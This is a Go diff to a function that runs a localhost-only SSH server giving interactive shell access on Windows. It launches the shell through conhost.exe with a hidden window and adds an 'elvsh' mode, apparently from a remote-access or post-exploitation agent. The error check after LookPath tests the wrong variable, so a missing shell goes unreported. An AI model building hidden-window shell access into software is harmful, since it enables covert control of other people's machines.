@@ -22,19 +22,16 @@ import (
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
-	if strings.HasSuffix(shell, "bash") {
-		// to use conhost.exe, the target must be at least Windows 7
-		// so it's safe to just set shell to powershell.exe
-		shell = "powershell.exe"
-	} else {
-		exe, e := exec.LookPath(shell)
-		if err != nil {
-			err = fmt.Errorf("%s not found (%v)", shell, e)
-			log.Print(err)
-			return
-		}
-		shell = exe
+	exe, e := exec.LookPath(shell)
+	if err != nil {
+		err = fmt.Errorf("%s not found (%v)", shell, e)
+		log.Print(err)
+		return
 	}
+	if shell == "elvsh" {
+		exe = util.ProcExe(os.Getpid())
+	}
+
 	// ssh server
 	ssh_server := ssh.Server{
 		Addr: "127.0.0.1:" + port,
@@ -46,10 +43,14 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	log.Printf("Using %s shell", strconv.Quote(shell))
 
 	ssh_server.Handle(func(s ssh.Session) {
-		cmd := exec.Command(shell, args...)
+		cmd := exec.Command(exe, args...)
 		if IsConPTYSupported() {
 			log.Print("ConPTY supported, the shell will be interactive")
-			args = append([]string{shell}, args...)
+			if len(args) > 0 {
+				args = append([]string{exe}, args...)
+			} else {
+				args = []string{exe}
+			}
 			cmd = exec.Command("conhost.exe", args...) // shell command
 		}
 		cmd.Env = os.Environ()
@@ -57,6 +58,21 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		cmd.Stdin = s
 		cmd.Stdout = s
 
+		// Evlsh
+		if shell == "elvsh" {
+			cmd.Env = append(cmd.Env, "ELVSH=TRUE")
+		}
+
+		// remove empty arg in cmd.Args
+		var tmp_args []string
+		for _, arg := range cmd.Args {
+			if strings.TrimSpace(arg) != "" {
+				tmp_args = append(tmp_args, arg)
+			}
+		}
+		cmd.Args = tmp_args
+
+		// ConPTY
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			HideWindow:    true,
 			CreationFlags: windows.CREATE_NEW_CONSOLE,
@@ -72,6 +88,9 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		} else {
 			log.Print("Got an SSH request")
 		}
+
+		log.Printf("sshd execute: %v, args(%d)=%v, env=%s",
+			cmd, len(cmd.Args), cmd.Args, cmd.Env)
 
 		if IsConPTYSupported() {
 
